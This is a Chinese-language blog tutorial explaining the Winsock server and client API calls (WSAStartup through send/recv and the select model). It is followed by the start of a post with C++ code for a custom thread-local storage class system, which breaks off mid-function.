一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 绑定地址与端口 int bind( SOCKET s, const sockaddr *addr, int namelen ); 作用 给我们的socket绑定端口号与具体地址 地址 找到咱们的电脑 只有一个 端口号 找到我们机器上对应的软件，比如QQ，浏览器等等，都对应着自己的端口号 多个 每一种通信的端口号是唯一的 同一个软件可能占用多个端口号 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 结构体 地址类型 装IP地址 端口号 结构体类型 sockaddr 该参数使用方法 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(“127.0.0.1”); sockAddress.sin_port = 12345; (sockaddr*)&amp;sockAddress强转添加到参数2上 成员1 跟socket函数参数1是一样的 成员2 IP地址 192.168.xxx.xxx 可以在控制台输入指令 ipconfig 就能看到了 或者在网络设置中，能找到这个地址 我就不演示了，我不想让你们发现我 127.0.0.1 回送地址 本地回环地址 本地网络测试 参数3 端口号 本质 就是一个整数 0~65535 IP是我们机器的地址，端口就是我们具体的软件的通信口，一个软件可能会占用多个接口，比如一个软件可以聊天，可以下载，可以看视频…那么这些不同的通信内容，往往会有各自的协议，各自的端口。 IP是公司地址，端口就是各个部门的地址了 填写哪个值呢？ 理论上只要这个范围0~65535都可以 实际 介于0～1023，为系统保留占用端口号 21端口分配给FTP(文件传输协议)服务 25端口分配给SMTP（简单邮件传输协议）服务 80端口分配给HTTP服务 所以 我们不能写这个范围的 我们的范围就是1024~65535 稍微大点儿，1万多 但是注意一点，端口号是唯一的，比如1234已经被别的软件占用了，那么你再使用1234这个端口号，那么就会绑定失败，因为已经呗占用了 给大家演示下 那大家如何查看自己要用的端口号有没有被占用呢？ 打开运行cmd输入netstat -ano 查看被使用的所有端口 netstat -aon|findstr “12345” 检查我们要使用的端口号是否被使用了 使用了就会显示使用的程序，未被使用就啥都不显示 参数3 参数2的类型大小 sizeof(参数2) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); 开始监听 int WSAAPI listen( SOCKET s, int backlog ); 作用 将套接字置于正在侦听传入连接的状态。 参数1 服务器端的socket，也就是socket函数创建的 参数2 挂起连接队列的最大长度。 就是说，比如有100个用户链接请求，但是系统一次只能处理20个，那么剩下的80个不能不理人家，所以系统就创建个队列记录这些暂时不能处理，一会儿处理的链接请求，依先后顺序处理，那这个队列到底多大？就是这个参数设置，比如2，那么就允许两个新链接排队的。这个肯定不能无限大，那内存不够了。 我们可以手动设置这个参数，但是别大了。可能210多，20多。 我们一般填写这个参数 SOMAXCONN 作用是让系统自动选择最合适的个数 不同的系统环境不一样，所以这个合适的数也都不一样 WSAAPI 调用约定 这个我们可以忽略，这是给系统看的，跟咱们没关 决定三 函数名字的编译方式 参数的入栈顺序 函数的调用时间 返回值 成功 返回0 失败 SOCKET_ERROR 具体错误码 WSAGetLastError() 释放 closesocket(socketListen); WSACleanup(); 创建客户端socket/接受连接 SOCKET WSAAPI accept( SOCKET s, sockaddr *addr, int *addrlen ); 作用 accept函数允许在套接字上进行传入连接尝试。 listen监听客户端来的链接，accept讲客户端的信息绑定到一个socket上，也就是给客户端创建一个socket,通过返回值返回给我们客户端的socket 一次只能创建一个，有几个客户端链接，就要调用几次 参数1 我们上面创建的自己的socket socket先处于监听状态，然后来的链接都在由这个管理，我们取客户端的信息，就是通过这个我们自己的socket 参数2 客户端的地址端口信息结构体 跟bind的第二个参数一样 意义：系统帮我们监视着客户端的动态，肯定会记录客户端的信息，也就是IP地址，和端口号，并通过这个结构体记录 SOCKADDR_IN sockClient 这个我们不用填写，系统帮我们填写，也即传址调用 参数2 3也能都设置成NULL，那就是不直接得到客户端的地址，端口号咯 此时可以通过函数得到客户端信息 getpeername(newSocket, (struct sockaddr*)&amp;sockClient, &amp;nLen); 得到本地服务器信息 getsockname(sSocket, (sockaddr*)&amp;addr, &amp;nLen); 参数3 参数2的大小 sizeof 返回值 成功 返回值就是给客户端包好的socket 与客户端通信就靠这个 失败 返回INVALID_SOCKET WSAGetLastError()得到错误码 释放空间 closesocket(socketListen); WSACleanup(); accept调试 1、阻塞，同步 这个函数是阻塞的，没有客户端链接，那就一直卡在这儿，等着。 2、多个链接 一次只能一个，5个就要5次循环 理解缺点 与客户端收发消息 收 int recv( SOCKET s, char *buf, int len, int flags ); 作用 得到指定客户端（参数1）发来的消息 原理 本质：复制 数据的接收都是由协议本身做的，也就是socket的底层做的，系统会有一段缓冲区，存储着接收到的数据。 咱们外边调用recv的作用，就是通过socket找到这个缓冲区，并把数据复制进咱们的参数2，复制参数3个 参数1 客户端的socket，每个客户端对应唯一的socket 参数2 客户端消息的存储空间，也就是个字符数组 这个一般1500字节 网络传输得最大单元，1500字节，也就是客户端发过来得数据，一次最大就是1500字节，这是协议规定，这个数值也是根据很多情况，总结出来得最优值 所以客户端最多一组来1500字节，咱们这头1500读一次，够够的了。 参数3 想要读取得字节个数 一般是参数2得字节数-1，把\\0字符串结尾留出来 参数4 数据的读取方式 0 正常逻辑来说 我们从系统缓冲区把数据读到我们的buf,读到我们buf中后，系统缓冲区的被读的就应该被删除掉了，不然也是浪费空间，毕竟，通信时间长的话，那就爆炸了 我们将缓冲区的数据读到我们自己的buf，根据需要处理相应的数据，这是我们可控的，完全玩儿弄于咱么你自己的鼓掌，系统缓冲区的数据，咱们无可奈何，操作不了 读出来的就删除的话，有很多的好处 1、系统缓冲区读到的数据，比我们的buf多，那么我们读出来的，系统删掉，从而我们就可以依次的把所有数据读完了 比如 系统缓冲区收到abcdefghijk，咱们的recvbuf一次读4个字节，那么我们放循环里，就会依次读出abcd,efgh,ijk 如果不删，那每次都是从头读 在循环里就是每次都是abcd…只读到这四个 2、可以计数收到了多少字节 返回值就是本次读出来的数据 正常这种逻辑 填0 哈哈 读出来的就删除 MSG_PEEK 窥视传入的数据。 数据将复制到缓冲区中，但不会从输入队列中删除。 读出来的不删除 这个东西是不建议被使用的 第一、读数据不行 第二、那就无法计数了 MSG_OOB 带外数据 意义 就是传输一段数据，在外带一个额外的特殊数据 相当于小声BB 实际 就不建议被使用了 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 MSG_WAITALL 直到系统缓冲区字节数满足参数3所请求得字节数，才开始读取 返回值 读出来字节数大小 读没了咋办？ 在recv函数卡着，等着客户端发来数据 即阻塞，同步 阻塞的 客户端下线，这端返回0 释放客户端socket 执行失败，返回SOCKET_ERROR WSAGetLastError()得到错误码 根据错误码信息做相应处理 重启 等待 不用理会 发 int WSAAPI send( SOCKET s, const char *buf, int len, int flags ); 作用 向目标发送数据 本质 send函数将我们的数据复制黏贴进系统的协议发送缓冲区，计算机伺机发出去 最大传输单元是1500字节 参数1 目标的socket，每个客户端对应唯一的socket 参数2 给对方发送的字节串 这个不要超过1500字节 发送时候，协议要进行包装，加上协议信息，也叫协议头，或者叫包头，咱们在理论部分，会非常详细的介绍协议头，以及功能 这个大小不同的协议不一样，链路层14字节，ip头20字节，tcp头20字节，数据结尾还要有状态确认，加起来也几十个字节，所以实际咱们的数据位，不能写1500个，要留出来，那就1024吧，或者最多1400，就差不多了 懂这个大体原理就好 详细的包的封装原理，我们在后面纯理论部分介绍 当然大家这个不一定每次都是正好那么多字节，比如聊天，一句话就十个八个的汉字，别多于1400是最好的 超过1500系统咋办？ 系统会分片处理 比如2000个字节 系统分成两个包 1400+包头==1500 假设包头100字节 600+包头==700 分两次发送出去 结果 1、系统要给咱们分包再打包，再发送， 客户端接收到了还得拆包，组合数据。从而增加了系统的工作，降低效率 2、有的协议，就把分片后的二包直接丢了 参数3 字节个数 1400 参数4 写0就行了 其他 MSG_OOB 意义同recv 就不用使用了 带外数据 意义 就是传输一段数据，在外带一个额外的特殊数据 相当于小声BB 实际 就不建议被使用了 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 MSG_DONTROUTE 指定数据不应受路由限制。 Windows套接字服务提供程序可以选择忽略此标志。 返回值 成功返回写入的字节数 执行失败，返回SOCKET_ERROR WSAGetLastError()得到错误码 根据错误码信息做相应处理 重启 等待 不用理会 客户端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN + 1]; char szSystemStatus[WSASYS_STATUS_LEN + 1]; } wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 链接到服务器 int WSAAPI connect ( SOCKET s, const sockaddr *name, int namelen ); 作用 链接服务器并把服务器信息与服务器socket绑定到一起 参数1 服务器socket 参数2 服务器Ip地址端口号结构体 参数3 参数2结构体大小 返回值 成功 返回0 失败 返回 SOCKET_ERROR WSAGetLastError()得到错误码 释放空间 closesocket(socketListen); WSACleanup(); 与服务器收发消息 收 recv(newSocket, szRecvBuffer, sizeof(szRecvBuffer), 0); 参数1 参数2 参数3 参数4 返回值 发 send(newSocket, szSendBuffer, strlen(szSendBuffer)+1, 0); 参数1 参数2 参数3 参数4 返回值 思考 加个循环，稍微完善下逻辑 问题 由于accept recv是阻塞的，做其中一件事，另外一件事就做不了，所以假设有多个客户端的情况下， 我们当前的模型，我先等，我不管及将来的是什么请求，我先等 结果：咱们在这等收消息recv，结果来了个链接请求，那就无法处理，链接只能accept 另外，我们等的socket可能没有发请求，那我们完了，等到睡着。 从而，我这个服务器，就是废了 分析 我们直接主动跟系统要，要什么？要有请求的socket，哪个有请求了，就给我哪个 结果： 得到链接请求，我们就直接accept 得到是发来了消息，我们就recv 从而就不会发生无谓的傻等情况 得到 select模型 select就是挑选的意思，它把请求的套接字给我们选出来，我们直接就去处理这些套接字 即：select就是处理accept与recv阻塞问题的 send本身也是阻塞的，不是长阻塞，是短阻塞","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"设计自己的线程局部存储","slug":"win0004-设计自己的线程局部存储","date":"2021-05-28T01:31:12.000Z","updated":"2021-06-08T14:34:41.327Z","comments":true,"path":"2021/05/28/win0004-设计自己的线程局部存储/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/28/win0004-设计自己的线程局部存储/","excerpt":"","text":"设计自己的线程局部存储 （1）自动管理它所保存的指针所指向的内存单元的分配和释放。这样做，一方面大大方 便了用户使用，另一方面，在一个线程不使用线程局部变量的情况下，管理系统可以决定不为 这个线程分配内存，从而节省内存空间。 （2）允许用户申请使用任意多个TLS索引。Microsoft确保每个进程的位数组中至少有TLS_MINIMUM_AVAILABLE个位标志是可用的。在WinNTh文件中这个值被定义为64，Windows 2000又做了扩展，使至少1000个标志可用。 新的TLS主要由4个类组成 CSimpleList类负责实现简单的链表功能，把各线程私有数据连在一起，以便能够释放它们占用的内存； CNoTrackObject类重载了new和delete操作符，负责为线程私有数据分配内存空间； CThreadSlotData类是整个系统的核心，它负责分配索引和存取线程私有数据； CThreadLocal是最终提供给用户使用的类模板，它负责为用户提供友好的接口函数。 线程的私有数据是自己自定义的结构或类,需要继承CNoTrackObject类 一个存放线程私有数据的数据结构CThreadData 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208///////////////////////////////////////////////////////// _AFXTLS_.H文件#ifndef __AFXTLS_H__ // _AFXTLS_.H 文件#define __AFXTLS_H__#include &lt;windows.h&gt;#include &lt;stddef.h&gt;class CNoTrackObject;////////////////////////////////////////////////// CSimpleListclass CSimpleList&#123;public://构造函数 CSimpleList(int nNextOffset = 0); //设置数据结构中pNext成员的偏移量 void Construct(int nNextOffset);// 提供给用户的接口函数（Operations），用于添加、删除和遍历节点 BOOL IsEmpty() const; //判断是否为空链表 void AddHead(void* p); //添加节点 void RemoveAll(); //删除所有结点 void* GetHead() const; //获取头结点 void* GetNext(void* p) const; //获取下一个结点 BOOL Remove(void* p); //删除结点// 为实现接口函数所需的成员（Implementation） void* m_pHead; // 链表中第一个元素的地址 size_t m_nNextOffset; // 数据结构中pNext成员的偏移量 void** GetNextPtr(void* p) const; //获取pNext的偏移地址&#125;;// 类的内联函数inline CSimpleList::CSimpleList(int nNextOffset)&#123; m_pHead = NULL; m_nNextOffset = nNextOffset; &#125;//设置数据结构中pNext成员的偏移量inline void CSimpleList::Construct(int nNextOffset)&#123; m_nNextOffset = nNextOffset; &#125;//判断链表为空,返回NULLinline BOOL CSimpleList::IsEmpty() const&#123; return m_pHead == NULL; &#125;//移除所有结点inline void CSimpleList::RemoveAll()&#123; m_pHead = NULL; &#125;//获取头节点inline void* CSimpleList::GetHead() const&#123; return m_pHead; &#125;//获取下一个结点的地址inline void* CSimpleList::GetNext(void* preElement) const&#123; return *GetNextPtr(preElement); &#125;//获取数据结构中pNext成员的偏移量inline void** CSimpleList::GetNextPtr(void* p) const&#123; return (void**)((BYTE*)p + m_nNextOffset); &#125;template&lt;class TYPE&gt;class CTypedSimpleList : public CSimpleList&#123;public: CTypedSimpleList(int nNextOffset = 0) : CSimpleList(nNextOffset) &#123; &#125; void AddHead(TYPE p) &#123; CSimpleList::AddHead((void*)p); &#125; TYPE GetHead() &#123; return (TYPE)CSimpleList::GetHead(); &#125; TYPE GetNext(TYPE p) &#123; return (TYPE)CSimpleList::GetNext(p); &#125; BOOL Remove(TYPE p) &#123; return CSimpleList::Remove(p); &#125; operator TYPE() &#123; return (TYPE)CSimpleList::GetHead(); &#125;&#125;;////////////////////////////////////////////////// CNoTrackObjectclass CNoTrackObject&#123;public: void* operator new(size_t nSize); void operator delete(void*); virtual ~CNoTrackObject() &#123; &#125;&#125;;/////////////////////////////////////////////////// CThreadSlotData - 管理我们自己的线程局部存储// warning C4291: no matching operator delete found#pragma warning(disable : 4291) struct CSlotData;struct CThreadData;class CThreadSlotData&#123;public: CThreadSlotData();// 提供给用户的接口函数（Operations） int AllocSlot(); void FreeSlot(int nSlot); void* GetThreadValue(int nSlot); void SetValue(int nSlot, void* pValue); void DeleteValues(HINSTANCE hInst, BOOL bAll = FALSE);// 类的实现代码（Implementations） DWORD m_tlsIndex; // 用来访问系统提供的线程局部存储 int m_nAlloc; // m_pSlotData所指向数组的大小 int m_nRover; // 为了快速找到一个空闲的槽而设定的值 int m_nMax; // CThreadData结构中pData指向的数组的大小 CSlotData* m_pSlotData; // 标识每个槽状态的全局数组的首地址 CTypedSimpleList&lt;CThreadData*&gt; m_list; // CThreadData结构的列表 CRITICAL_SECTION m_cs; void* operator new(size_t, void* p) &#123; return p; &#125; void DeleteValues(CThreadData* pData, HINSTANCE hInst); ~CThreadSlotData();&#125;;///////////////////////////////////////////////class CThreadLocalObject&#123;public:// 属性成员(Attributes)，用于取得保存在线程局部的变量中的指针 CNoTrackObject* GetData(CNoTrackObject* (*pfnCreateObject)()); CNoTrackObject* GetDataNA();// 具体实现(Implementation) DWORD m_nSlot; ~CThreadLocalObject();&#125;;template&lt;class TYPE&gt;class CThreadLocal : public CThreadLocalObject&#123;// 属性成员（Attributes）public: TYPE* GetData() &#123; TYPE* pData = (TYPE*)CThreadLocalObject::GetData(&amp;CreateObject); return pData; &#125; TYPE* GetDataNA() &#123; TYPE* pData = (TYPE*)CThreadLocalObject::GetDataNA(); return pData; &#125; operator TYPE*() &#123; return GetData(); &#125; TYPE* operator-&gt;() &#123; return GetData(); &#125;// 具体实现（Implementation）public: static CNoTrackObject* CreateObject() &#123; return new TYPE; &#125;&#125;;#define THREAD_LOCAL(cla.ss_name, ident_name) \\ CThreadLocal&lt;class_name&gt; ident_name;#define EXTERN_THREAD_LOCAL(class_name, ident_name) \\ extern THREAD_LOCAL(class_name, ident_name)#endif // __AFXTLS_H__/*2.2.4 #ifndef __AFXTLS_H__ // _AFXTLS_.H 文件#define __AFXTLS_H__#include &lt;windows.h&gt;class CThreadLocalObject&#123;public: CThreadLocalObject();// 属性成员(Attributes)，用于取得保存在线程局部的变量中的指针 LPVOID GetData(LPVOID (*pfnCreateObject)()); LPVOID GetDataNA();// 执行体(Implementation)，实现类接口所需的成员 DWORD m_tlsIndex; ~CThreadLocalObject(); &#125;;#endif // __AFXTLS_H__ */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341///////////////////////////////////////////////////////// AFXTLS.CPP文件#include \"_AFXTLS_.H\"//------------------CSimpleList类---------------------------//添加节点void CSimpleList::AddHead(void* p)&#123; *GetNextPtr(p) = m_pHead; m_pHead = p;&#125;//删除结点BOOL CSimpleList::Remove(void* p)&#123; if(p == NULL) // 检查参数 return FALSE; BOOL bResult = FALSE; // 假设移除失败 if(p == m_pHead) &#123; // 要移除头元素 m_pHead = *GetNextPtr(p); bResult = TRUE; &#125; else &#123; // 试图在表中查找要移除的元素 void* pTest = m_pHead; while(pTest != NULL &amp;&amp; *GetNextPtr(pTest) != p) pTest = *GetNextPtr(pTest); // 如果找到，就将元素移除 if(pTest != NULL) &#123; *GetNextPtr(pTest) = *GetNextPtr(p); bResult = TRUE; &#125; &#125; return bResult;&#125;//-------------------CThreadSlotData类----------------------//BYTE __afxThreadData[sizeof(CThreadSlotData)]; // 为下面的_afxThreadData变量提供内存CThreadSlotData* _afxThreadData; // 定义全局变量_afxThreadData来为全局变量分配空间//槽状态结构struct CSlotData&#123; DWORD dwFlags; // 槽的使用标志（被分配/未被分配） HINSTANCE hInst;// 占用此槽的模块句柄&#125;;//链表节点结构struct CThreadData : public CNoTrackObject&#123; CThreadData* pNext; // CSimpleList类要使用此成员 int nCount; // 数组元素的个数 LPVOID* pData; // 数组的首地址&#125;;#define SLOT_USED 0x01 // CSlotData结构中dwFlags成员的值为0x01时表示该槽已被使用//构造函数,前期的初始化CThreadSlotData::CThreadSlotData()&#123; m_list.Construct(offsetof(CThreadData, pNext)); // 初始化CTypedSimpleList对象 m_nMax = 0; m_nAlloc = 0; m_nRover = 1; // 我们假定Slot1还未被分配（第一个槽（Slot0）总是保留下来不被使用） m_pSlotData = NULL; m_tlsIndex = ::TlsAlloc(); // 使用系统的TLS申请一个索引 ::InitializeCriticalSection(&amp;m_cs); // 初始化关键段变量&#125;//在位数组上获取可用的槽号int CThreadSlotData::AllocSlot()&#123; ::EnterCriticalSection(&amp;m_cs); // 进入临界区（也叫关键段） int nAlloc = m_nAlloc; int nSlot = m_nRover; //如果当前要使用的槽号大于位数组个数,或当前槽号已经被使用 if(nSlot &gt;= nAlloc || m_pSlotData[nSlot].dwFlags &amp; SLOT_USED) &#123; // 搜索m_pSlotData，查找空槽（SLOT） for(nSlot = 1; nSlot &lt; nAlloc &amp;&amp; m_pSlotData[nSlot].dwFlags &amp; SLOT_USED; nSlot ++) ; // 如果不存在空槽，申请更多的空间 if(nSlot &gt;= nAlloc) &#123; // 增加全局数组的大小，分配或再分配内存以创建新槽 int nNewAlloc = nAlloc + 32; HGLOBAL hSlotData; if(m_pSlotData == NULL) // 第一次使用 &#123; hSlotData = ::GlobalAlloc(GMEM_MOVEABLE, nNewAlloc*sizeof(CSlotData)); &#125; else &#123; //获取当前位数组的句柄 hSlotData = ::GlobalHandle(m_pSlotData); //位数组从物理内存中解除 ::GlobalUnlock(hSlotData); //重新设置位数组的大小 hSlotData = ::GlobalReAlloc(hSlotData, nNewAlloc*sizeof(CSlotData), GMEM_MOVEABLE); &#125; //将位数组绑定到物理内存中 CSlotData* pSlotData = (CSlotData*)::GlobalLock(hSlotData); // 将新申请的空间初始化为0 memset(pSlotData + m_nAlloc, 0, (nNewAlloc - nAlloc)*sizeof(CSlotData)); m_nAlloc = nNewAlloc; m_pSlotData = pSlotData; &#125; &#125; // 调整m_nMax的值，以便为各线程的私有数据分配内存 if(nSlot &gt;= m_nMax) m_nMax = nSlot + 1; m_pSlotData[nSlot].dwFlags |= SLOT_USED; // 更新m_nRover的值(我们假设下一个槽未被使用) m_nRover = nSlot + 1; ::LeaveCriticalSection(&amp;m_cs); return nSlot; // 返回的槽号可以被FreeSlot, GetThreadValue, SetValue函数使用了&#125;void CThreadSlotData::FreeSlot(int nSlot)&#123; ::EnterCriticalSection(&amp;m_cs); // 删除所有线程中的数据 CThreadData* pData = m_list; while(pData != NULL) &#123; if(nSlot &lt; pData-&gt;nCount) &#123; delete (CNoTrackObject*)pData-&gt;pData[nSlot]; pData-&gt;pData[nSlot] = NULL; &#125; pData = pData-&gt;pNext; &#125; // 将此槽号标识为未被使用 